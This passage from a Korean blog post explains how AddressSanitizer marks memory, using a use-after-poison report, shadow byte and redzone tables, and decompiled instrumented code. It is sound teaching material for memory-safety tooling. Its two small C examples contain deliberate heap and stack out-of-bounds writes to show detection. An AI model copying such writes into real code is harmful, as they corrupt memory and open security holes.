0x7ffcc58dc208WRITE of size 7 at 0x502000000010 thread T0    <span class="hljs-comment">#0 0x7f0804f052c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827</span>    <span class="hljs-comment">#1 0x55577d55a300 in main (/root/asan/unpoison+0x1300)</span>    <span class="hljs-comment">#2 0x7f0804998d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>    <span class="hljs-comment">#3 0x7f0804998e3f in __libc_start_main_impl ../csu/libc-start.c:392</span>    <span class="hljs-comment">#4 0x55577d55a1a4 in _start (/root/asan/unpoison+0x11a4)</span>0x502000000010 is located 0 bytes inside of 8-byte region [0x502000000010,0x502000000018)allocated by thread T0 here:    <span class="hljs-comment">#0 0x7f0804f7f887 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145</span>    <span class="hljs-comment">#1 0x55577d55a284 in cus_alloc(unsigned long) (/root/asan/unpoison+0x1284)</span>    <span class="hljs-comment">#2 0x55577d55a2e1 in main (/root/asan/unpoison+0x12e1)</span>    <span class="hljs-comment">#3 0x7f0804998d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>SUMMARY: AddressSanitizer: use-after-poison ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 <span class="hljs-keyword">in</span> __interceptor_memcpyShadow bytes around the buggy address:  0x0a047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x0a047fff8000: fa fa[f7]fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after <span class="hljs-built_in">return</span>:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      <span class="hljs-built_in">fc</span>  Array cookie:            ac  Intra object redzone:    bb  ASan internal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==1381294==ABORTING</code></pre><p>use-after-poison&#xC774;&#xB77C;&#xACE0; &#xC798; &#xC54C;&#xB824;&#xC8FC;&#xB124;&#xC694;!</p><h3 id="2-3-Redzone"><a href="#2-3-Redzone" class="headerlink" title="2.3 Redzone"></a>2.3 Redzone</h3><p>poison&#xACFC; unpoison&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC0C1;&#xD0DC;&#xC640; &#xC2DC;&#xAC04;&#xC801;&#xC778; &#xC0DD;&#xBA85;&#xC8FC;&#xAE30;&#xB97C; &#xAD00;&#xB9AC;&#xD55C;&#xB2E4;&#xBA74; redzone&#xC740; &#xAC80;&#xC0AC; &#xB300;&#xC0C1;&#xC758; &#xC8FC;&#xBCC0; &#xACF5;&#xAC04;(&#xACBD;&#xACC4;)&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. &#xBA54;&#xBAA8;&#xB9AC; &#xAC1D;&#xCCB4;&#xC758; &#xC2E4;&#xC81C; &#xC0AC;&#xC6A9; &#xC601;&#xC5ED; &#xC8FC;&#xBCC0;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAE08;&#xC9C0;&#xB41C; &#xACF5;&#xAC04;&#xC744; &#xBC30;&#xCE58;&#xD558;&#xB294;&#xB370; &#xC774; &#xACF5;&#xAC04;&#xC744; &#xBC14;&#xB85C; redzone&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/12/25/millet/asan-pt1-kr/image7.png" alt></p><p>redzone&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC601;&#xC5ED;&#xC740; &#xD56D;&#xC0C1; poison &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACBD;&#xACC4;&#xB97C; &#xB118;&#xC5B4;&#xC11C;&#xB294; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB098; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xC798;&#xBABB;&#xB41C; &#xC811;&#xADFC;&#xC740; redzone&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAC8C; &#xB418;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB098; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xAC10;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>redzone&#xC740; &#xD06C;&#xAC8C; &#xD799;, &#xC2A4;&#xD0DD;, &#xC804;&#xC5ED; &#xBC84;&#xD37C;&#xC5D0; &#xBC30;&#xCE58;&#xB418;&#xBA70; &#xBAA8;&#xB450; shadow memory&#xC758; poison&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB429;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>Shadow Byte</th><th>&#xC758;&#xBBF8;</th><th>&#xC0C1;&#xD0DC;</th></tr></thead><tbody><tr><td><code>0xfa</code></td><td>Heap left redzone</td><td>poison</td></tr><tr><td><code>0xf1</code></td><td>Stack left redzone</td><td>poison</td></tr><tr><td><code>0xf2</code></td><td>Stack mid redzone</td><td>poison</td></tr><tr><td><code>0xf3</code></td><td>Stack right redzone</td><td>poison</td></tr><tr><td><code>0xf5</code></td><td>Stack after return</td><td>poison</td></tr><tr><td><code>0xf9</code></td><td>Global redzone</td><td>poison</td></tr><tr><td><code>0xca</code></td><td>Left alloca redzone</td><td>poison</td></tr><tr><td><code>0xcb</code></td><td>Right alloca redzone</td><td>poison</td></tr></tbody></table></div><p>&#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xD799;&#xC5D0; &#xC0BD;&#xC785;&#xB418;&#xB294; redzone&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// g++ redzone.cpp -o redzone -fsanitize=address</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">char</span> *p = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">6</span>);    p[<span class="hljs-number">6</span>] = <span class="hljs-string">&apos;m&apos;</span>;    <span class="hljs-built_in">free</span>(p);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>x86-64 &#xD658;&#xACBD;&#xC5D0;&#xC11C; ptmalloc2&#xB294; &#xCCAD;&#xD06C;&#xB97C; 16&#xBC14;&#xC774;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. <code>malloc(6)</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xBA74; ptmalloc2&#xB294; &#xCD1D; 32&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xACF5;&#xAC04;&#xC744; &#xD560;&#xB2F9;&#xD574;&#xC8FC;&#xAC8C; &#xB418;&#xB294;&#xB370;&#xC694;. &#xC774; &#xC911; user data &#xC601;&#xC5ED;&#xC758; 6&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xACF5;&#xAC04;&#xC740; &#xC811;&#xADFC;&#xC774; &#xBC1C;&#xC0DD;&#xD574;&#xC11C;&#xB294; &#xC548;&#xB418;&#xB294; &#xACF5;&#xAC04;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">...   0x5555555551d1 &lt;main+0008&gt;      sub    rsp, 0x10   0x5555555551d5 &lt;main+000c&gt;      mov    edi, 0x6   0x5555555551da &lt;main+0011&gt;      call   0x5555555550b0 &lt;malloc@plt&gt; &#x2192; 0x5555555551df &lt;main+0016&gt;      mov    QWORD PTR [rbp-0x8], rax...gef&#x27A4;  x/4bx ((<span class="hljs-variable">$rax</span> &gt;&gt; 3) + 0x7fff8000) - 20xa047fff8000:  0xfa    0xfa    0x06    0xfa</code></pre><p>&#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xD6C4;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xB294; &#xACF5;&#xAC04;&#xC758; shadow byte &#xAC12;&#xB9CC; <code>0x06</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xB098;&#xBA38;&#xC9C0; &#xACF5;&#xAC04;&#xC740; Heap left redzone&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; <code>0xfa</code>&#xB85C; &#xC124;&#xC815;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xB2E4;&#xC74C;&#xC758; &#xC870;&#xAC74;&#xBB38;&#xC5D0; &#xC758;&#xD574; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xAC10;&#xC9C0;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/25/millet/asan-pt1-kr/image8.png" alt></p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xC758; &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// g++ redzone.cpp -o redzone -fsanitize=address</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">char</span> sp[<span class="hljs-number">16</span>] = {<span class="hljs-number">0</span>, };    sp[<span class="hljs-number">17</span>] = <span class="hljs-string">&apos;i&apos;</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xBE4C;&#xB4DC;&#xB41C; &#xD6C4; ASan&#xC5D0; &#xC758;&#xD574; &#xC7AC;&#xC791;&#xC131;&#xB41C; <code>main()</code> &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// rbx</span>  __int64 v4; <span class="hljs-comment">// rax</span>  _BYTE *v5; <span class="hljs-comment">// rdx</span>  __int64 v6; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// si</span>  _BYTE v9[<span class="hljs-number">88</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span>  <span class="hljs-keyword">unsigned</span> __int64 cnry; <span class="hljs-comment">// [rsp+58h] [rbp-18h]</span>  v3 = (<span class="hljs-keyword">unsigned</span> __int64)v9;  <span class="hljs-keyword">if</span> ( _TMC_END__ )  {    v4 = __asan_stack_malloc_0(<span class="hljs-number">64</span>, argv, envp);    <span class="hljs-keyword">if</span> ( v4 )      v3 = v4;  }  v5 = (_BYTE *)(v3 + <span class="hljs-number">0x60</span>);  *(_QWORD *)v3 = <span class="hljs-number">0x41B58AB3</span>;  *(_QWORD *)(v3 + <span class="hljs-number">8</span>) = <span class="hljs-string">&quot;1 32 16 4 sp:5&quot;</span>;  *(_QWORD *)(v3 + <span class="hljs-number">16</span>) = main;  v6 = v3 &gt;&gt; <span class="hljs-number">3</span>;  *(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF1F1F1F1</span>;  *(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8004</span>) = <span class="hljs-number">0xF3F30000</span>;  cnry = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">if</span> ( *(_WORD *)(((v3 + <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>) )    v6 = __asan_report_store16(v3 + <span class="hljs-number">32</span>);  *((_QWORD *)v5 - <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;  *((_QWORD *)v5 - <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;  v7 = *(_BYTE *)(((<span class="hljs-keyword">unsigned</span> __int64)(v5 - <span class="hljs-number">47</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>);  <span class="hljs-keyword">if</span> ( v7 != <span class="hljs-number">0</span> &amp;&amp; (((<span class="hljs-keyword">unsigned</span> __int8)v5 - <span class="hljs-number">64</span> + <span class="hljs-number">17</span>) &amp; <span class="hljs-number">7</span>) &gt;= v7 )    v6 = __asan_report_store1(v5 - <span class="hljs-number">47</span>);  *(v5 - <span class="hljs-number">47</span>) = <span class="hljs-string">&apos;i&apos;</span>;  <span class="hljs-keyword">if</span> ( v9 == (_BYTE *)v3 )  {    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span>  {    *(_QWORD *)v3 = <span class="hljs-number">0x45E0360E</span>;    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF5F5F5F5F5F5F5F5</span>LL;    **(_BYTE **)(v3 + <span class="hljs-number">0x38</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC6CC;&#xD6C4;,,, &#xBB54;&#xAC00; &#xB9CE;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xC5C8;&#xB124;&#xC694;. &#xBCF5;&#xC7A1;&#xD574;&#xBCF4;&#xC774;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xC704;&#xC5D0;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xB358; &#xAC1C;&#xB150;&#xB4E4;&#xC744; &#xC801;&#xC6A9;&#xD574;&#xC11C; &#xBCF8;&#xB2E4;&#xBA74; &#xD06C;&#xAC8C; &#xC5B4;&#xB835;&#xC9C0;&#xB294; &#xC54A;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xC529; &#xB72F;&#xC5B4;&#xBCFC;&#xAE4C;&#xC694;?</p><p><strong>ASan &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784; &#xC124;&#xC815;</strong></p><p><code>v9</code>&#xC740; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xC124;&#xC815;&#xD574;&#xB193;&#xC740; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784; &#xBC84;&#xD37C;&#xC758; &#xCD5C;&#xC0C1;&#xB2E8;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xC744; ASan&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; <code>v3</code> &#xBCC0;&#xC218;&#xB85C; &#xC62E;&#xAE30;&#xB294; &#xB3D9;&#xC791;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">v3 = (<span class="hljs-keyword">unsigned</span> __int64)v9;<span class="hljs-keyword">if</span> ( _TMC_END__ ){  v4 = __asan_stack_malloc_0(<span class="hljs-number">64</span>, argv, envp);  <span class="hljs-keyword">if</span> ( v4 )    v3 = v4;}</code></pre><ul><li><code>_TMC_END__</code>&#xB77C;&#xB294; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC2A4;&#xD0DD;&#xC744; &#xB2E4;&#xC2DC; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xC774;&#xAC83;&#xC740; &#xC2A4;&#xD0DD; &#xC7AC;&#xC0AC;&#xC6A9;&#xC744; &#xAC10;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; <code>ASAN_OPTIONS=detect_stack_use_after_return</code>&#xC5D0; &#xB530;&#xB77C; &#xACB0;&#xC815;&#xB418;&#xB294; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/12/25/millet/asan-pt1-kr/image9.png" alt></p><p><strong>&#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xAE30;&#xB85D;</strong></p><p>&#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC5D0; &#xB300;&#xD55C; &#xBCC4;&#xB3C4;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC758; &#xD604;&#xC7AC; &#xC0C1;&#xD0DC;&#xC640; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC758;&#xB3C4;&#xD558;&#xB294; &#xD504;&#xB808;&#xC784; &#xB0B4; &#xAC1D;&#xCCB4; &#xB808;&#xC774;&#xC544;&#xC6C3; &#xB4F1;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">v5 = (_BYTE *)(v3 + <span class="hljs-number">0x60</span>);*(_QWORD *)v3 = <span class="hljs-number">0x41B58AB3</span>;*(_QWORD *)(v3 + <span class="hljs-number">8</span>) = <span class="hljs-string">&quot;1 32 16 4 sp:5&quot;</span>;*(_QWORD *)(v3 + <span class="hljs-number">16</span>) = main;</code></pre><ul><li><p><code>0x41B58AB3</code>: &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xAE30; &#xC704;&#xD55C; magic number. &#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC774; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_internal.h</strong></p></blockquote>  <pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uptr kCurrentStackFrameMagic = <span class="hljs-number">0x41B58AB3</span>;<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uptr kRetiredStackFrameMagic = <span class="hljs-number">0x45E0360E</span>;</code></pre></li><li><p><code>&quot;1 32 16 4 sp:5&quot;</code>: &#xC2A4;&#xD0DD; &#xAC1D;&#xCCB4; 1&#xAC1C;, &#xC624;&#xD504;&#xC14B; 32, &#xD06C;&#xAE30; 16, &#xB0B4;&#xBD80; &#xC774;&#xB984; sp:5</p></li><li><code>main</code>: &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xC758; &#xD504;&#xB808;&#xC784;&#xC778;&#xC9C0; &#xAE30;&#xB85D;</li></ul><p><strong>Stack redzone &#xC124;&#xC815;</strong></p><p>&#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; 16&#xBC14;&#xC774;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; shadow byte 2&#xAC1C;&#xB97C; unpoison&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD55C; &#xD6C4; &#xC591;&#xCABD; &#xC601;&#xC5ED;&#xC5D0; &#xB300;&#xD574; &#xAC01;&#xAC01; Stack left redzone&#xACFC; Stack right redzone&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">v6 = v3 &gt;&gt; <span class="hljs-number">3</span>;*(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF1F1F1F1</span>;*(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8004</span>) = <span class="hljs-number">0xF3F30000</span>;</code></pre><p><strong>&#xAC1D;&#xCCB4; &#xC811;&#xADFC; &#xC804; &#xAC80;&#xC0AC; &#x2192; &#xC811;&#xADFC; &#xB85C;&#xC9C1;</strong></p><p>&#xC774; &#xBD80;&#xBD84;&#xC740; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; shadow memory &#xAC80;&#xC0AC;&#xC640; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAC80;&#xC0AC;&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC740; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xC758; &#xC815;&#xBCF4;&#xC640; &#xB3D9;&#xC77C;&#xD55C; <code>+32</code> &#xC9C0;&#xC810;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_WORD *)(((v3 + <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>) )  v6 = __asan_report_store16(v3 + <span class="hljs-number">32</span>);*((_QWORD *)v5 - <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;*((_QWORD *)v5 - <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;v7 = *(_BYTE *)(((<span class="hljs-keyword">unsigned</span> __int64)(v5 - <span class="hljs-number">47</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>);<span class="hljs-keyword">if</span> ( v7 != <span class="hljs-number">0</span> &amp;&amp; (((<span class="hljs-keyword">unsigned</span> __int8)v5 - <span class="hljs-number">64</span> + <span class="hljs-number">17</span>) &amp; <span class="hljs-number">7</span>) &gt;= v7 )  v6 = __asan_report_store1(v5 - <span class="hljs-number">47</span>);*(v5 - <span class="hljs-number">47</span>) = <span class="hljs-string">&apos;i&apos;</span>;</code></pre><p>&#xBB54;&#xAC00; &#xC5F0;&#xC0B0;&#xC774; &#xBCF5;&#xC7A1;&#xD558;&#xC9C0;&#xB9CC; &#xACB0;&#xAD6D; &#xBC30;&#xC5F4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>+32</code> &#xC9C0;&#xC810;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (<code>__asan_report_storeX()</code> &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C; &#xB2E8;&#xB77D;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.)</p><p><strong>&#xD568;&#xC218; &#xBC18;&#xD658; &#xC804; &#xC815;&#xB9AC;</strong></p><p>&#xB9CC;&#xC57D; <code>v9</code>&#xACFC; <code>v3</code>&#xC774; &#xAC00;&#xB77C;&#xD0A4;&#xB294; &#xAC12;&#xC774; &#xB3D9;&#xC77C;&#xD558;&#xB2E4;&#xBA74; &#xC9C4;&#xC9DC; &#xC2A4;&#xD0DD;&#xC774;&#xB2C8; &#xB2E4;&#xB978; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC704;&#xD574; unpoison&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD574;&#xC8FC;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74; ASan&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; fake stack&#xC758; &#xACBD;&#xC6B0;&#xC77C;&#xD150;&#xB370; &#xC774; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>kRetiredStackFrameMagic</code>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; <code>0x45E0360E</code>&#xC73C;&#xB85C; magic number &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xACE0; Stack after return&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; <code>0xf5</code>&#xB85C; poision&#xC744; &#xC124;&#xC815;&#xD558;&#xB124;&#xC694;! &#xAC1C;&#xB150;&#xC744; &#xBCF4;&#xACE0; &#xB098;&#xB2C8; &#xCF54;&#xB4DC;&#xB97C; &#xC774;&#xD574;&#xD558;&#xB294; &#xAC74; &#xC26C;&#xC6B4; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD638;&#xD638;&#xD638;</p><pre><code class="hljs c">  <span class="hljs-keyword">if</span> ( v9 == (_BYTE *)v3 )  {    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span>  {    *(_QWORD *)v3 = <span class="hljs-number">0x45E0360E</span>;    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF5F5F5F5F5F5F5F5</span>LL;    **(_BYTE **)(v3 + <span class="hljs-number">0x38</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><h2 id="3-&#xC624;&#xB958;-&#xBCF4;&#xACE0;"><a href="#3-&#xC624;&#xB958;-&#xBCF4;&#xACE0;" class="headerlink" title="3. &#xC624;&#xB958; &#xBCF4;&#xACE0;"></a>3. &#xC624;&#xB958; &#xBCF4;&#xACE0;</h2><h3 id="3-1-&#xC624;&#xB958;-&#xBCF4;&#xACE0;&#xC6A9;-&#xD568;&#xC218;"><a href="#3-1-&#xC624;&#xB958;-&#xBCF4;&#xACE0;&#xC6A9;-&#xD568;&#xC218;" class="headerlink" title="3.1 &#xC624;&#xB958; &#xBCF4;&#xACE0;&#xC6A9; &#xD568;&#xC218;"></a>3.1 &#xC624;&#xB958; &#xBCF4;&#xACE0;&#xC6A9; &#xD568;&#xC218;</h3><p>&#xAC80;&#xC0AC; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xD1B5;&#xACFC;&#xD558;&#xC9C0; &#xBABB;&#xD588;&#xC744; &#xACBD;&#xC6B0; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBCF4;&#xACE0; &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC758;&#xB418;&#xC5B4; 